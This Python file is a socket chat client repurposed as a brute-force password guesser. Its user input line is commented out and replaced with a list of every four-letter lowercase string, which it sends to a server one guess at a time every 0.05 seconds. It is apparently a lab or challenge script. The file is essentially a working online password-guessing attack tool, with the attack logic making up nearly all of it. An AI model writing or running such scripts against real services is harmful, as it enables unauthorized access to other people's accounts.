import socket, threading, sys, string, itertools, time

def write_msg(msg):
    sys.stdout.flush()
    sys.stdout.write(msg)
    sys.stdout.flush()

def handle_messages(connection: socket.socket):
    '''
        Receive messages sent by the server and display them to user
    '''



    while True:
        try:
            msg = connection.recv(1024).decode()

            # If there is no message, there is a chance that connection has closed
            # so the connection will be closed and an error will be displayed.
            # If not, it will try to decode message in order to show to user.
            if msg:
                write_msg(msg)
            else:
                connection.close()
                break

        except Exception as e:
            print(f'Error handling message from server: {e}')
            connection.close()
            break

def build_passwords():
    chars = string.ascii_lowercase
    attempts = 0
    passwords = []
    for password_length in range(4, 5):
        for guess in itertools.product(chars, repeat=password_length):
            attempts += 1
            guess = ''.join(guess)
            passwords.append(guess)
    return passwords

def client(ip_address: str, port: int) -> None:
    '''
        Main process that start client connection to the server
        and handle it's input messages
    '''

    SERVER_ADDRESS = ip_address
    SERVER_PORT = port

    c = 0

    try:
        # Instantiate socket and start connection with server
        socket_instance = socket.socket()
        socket_instance.connect((SERVER_ADDRESS, SERVER_PORT))
        # Create a thread in order to handle messages sent by server
        threading.Thread(target=handle_messages, args=[socket_instance]).start()

        print('Connected to chat!')

        socket_instance.send(' '.encode())

        passwords = build_passwords()

        # Read user's input until it quit from chat and close connection
        while True:
            #msg = input().strip()
            msg = passwords[c]
            if len(msg) == 0:
                msg = ' '

            if msg == 'quit':
                break

            # Parse message to utf-8
            socket_instance.send(msg.encode())

            c += 1

            time.sleep(0.05)

        # Close connection with the server
        socket_instance.close()

    except Exception as e:
        print(f'Error connecting to server socket {e}')
        socket_instance.close()


if __name__ == "__main__":
    ip_address = input('Enter server IP address: ')
    port = int(input('Enter server port: '))
    client(ip_address, port)
